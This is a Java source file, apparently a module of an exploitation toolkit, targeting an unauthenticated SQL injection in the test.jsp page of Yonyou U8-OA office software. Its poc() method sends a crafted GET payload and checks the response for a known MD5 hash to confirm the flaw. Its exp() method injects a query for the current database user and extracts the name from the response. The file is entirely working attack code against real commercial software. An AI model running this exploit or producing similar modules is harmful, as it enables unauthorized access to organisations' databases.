package cn.exploit;

import cn.utils.HttpUtil;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 用友U8-OA test.jsp 文件SQL注入(无需登录)
 */
public class Yonyou_U8_OA_test_SQLi extends ExploitFather {

    HttpUtil httpUtil = new HttpUtil();

    @Override
    public String poc(String url) {
        String result = "不存在漏洞";
        //设置get类型payload
        String send = url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))";
        httpUtil.url = send;
        //设置header头
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        httpUtil.headers = headers;
        //获取返回内容
        String[] resContent = httpUtil.doGet();
        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200")){
                if(text.contains("c4ca4238a0b923820dcc509a6f75849b")){
                    result = "存在漏洞!";
                }
            }
        }
        return result;
    }

    @Override
    public String exp(String url,String payload) {
        String result = "未利用成功";
        //设置get类型payload
        String send = url + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20user())";
        httpUtil.url = send;
        //设置header头
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        httpUtil.headers = headers;
        //获取返回内容
        String[] resContent = httpUtil.doGet();
        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200")){
                //正则判断
                String pattern = "<td align=left>(.*?)</td>";
                Pattern r = Pattern.compile(pattern);
                Matcher m = r.matcher(text);
                if(m.find()){
                    result = "当前数据库用户名:"+m.group(1);
                }
            }
        }
        return result;
    }

}
